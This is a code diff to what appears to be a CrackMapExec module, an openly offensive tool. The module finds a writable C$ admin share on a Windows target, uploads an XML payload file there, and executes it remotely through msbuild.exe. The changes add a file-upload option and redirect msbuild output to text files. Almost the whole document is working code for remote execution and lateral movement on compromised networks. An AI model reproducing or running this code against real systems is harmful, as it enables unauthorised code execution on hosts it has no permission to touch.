@@ -14,6 +14,7 @@ class CMEModule:
             FILENAME Name of the .xml file to build
             ARCH Architecture of target system (x86 or x 64)
             VER .NET Version targeted
+            TFILE Path for file upload TFILE=
         '''
         self.filename = 'cme.xml'
         self.arch = ''
@@ -27,12 +28,10 @@ class CMEModule:
         for share in shares:
             if 'WRITE' in share['access'] and share['name'] in ['C$']:
                 context.log.success('Found writable share: {}'.format(share['name']))
-                print('filename: {}'.format(self.filename))
                 with open(self.filename, 'rb') as file:
                     try:
                         connection.conn.putFile(share['name'], "\\test.xml", file.read)
                         self.targetFile = share['name'][:-1] + ':\\test.xml'
-                        print('targetFile: {}'.format(self.targetFile))
                         context.log.success('Uploaded file to {}:\\test.xml'.format(share['name']))
                     except Exception as e:
                         context.log.error('Error uploading file {}: {}'.format(share['name'][:-1], e))
@@ -40,10 +39,10 @@ class CMEModule:
                 pass
         if self.arch == 'x64':
             winders = "%WINDIR%\\Microsoft.NET\\Framework64\\"+ self.ver+ "\\msbuild.exe"
-            command = '{} {}'.format(winders, self.targetFile)
+            command = '{} {} > file2.txt'.format(winders, self.targetFile)
         elif self.arch == 'x86':
             winders = "%WINDIR%\\Microsoft.NET\\Framework\\"+ self.ver+ "\\msbuild.exe"
-            command = '{} {}'.format(winders, self.targetFile)
+            command = '{} {} > file1.txt'.format(winders, self.targetFile)
         else:
             print("You need to supply the 'ARCH' command line argument :)")
         try:
